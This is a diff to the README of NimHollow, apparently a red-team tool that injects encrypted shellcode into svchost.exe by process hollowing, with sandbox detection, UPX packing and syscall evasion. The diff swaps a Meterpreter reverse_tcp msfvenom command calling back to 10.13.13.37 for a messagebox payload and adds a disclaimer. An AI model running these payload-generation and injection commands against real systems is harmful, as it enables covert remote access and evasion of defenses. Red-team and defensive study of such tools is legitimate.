@@ -9,6 +9,8 @@ Features:
 * Shellcode encryption/decryption with [AES in CTR mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)).
 * Simple sandbox detection methods from the OSEP course by @offensive-security.
 
+> **DISCLAIMER.** All information contained in this repository is provided for educational and research purposes only. The author is not responsible for any illegal use of this tool.
+
 ## Usage
 
 Installation:
@@ -24,11 +26,8 @@ Installation:
 Example:
 
 ```console
-~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.13.37 LPORT=31337 EXITFUNC=thread -f raw -o shellcode.bin
+~$ msfvenom -p windows/x64/messagebox TITLE='MSF' TEXT='Hack the Planet!' EXITFUNC=thread -f raw -o shellcode.bin
 ~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\svchost.exe' -o injector --upx --rm [--whispers2]
-~$ file injector.exe
-injector.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
-~$ sudo msfconsole -qr msf.rc
 ```
 
 Help:
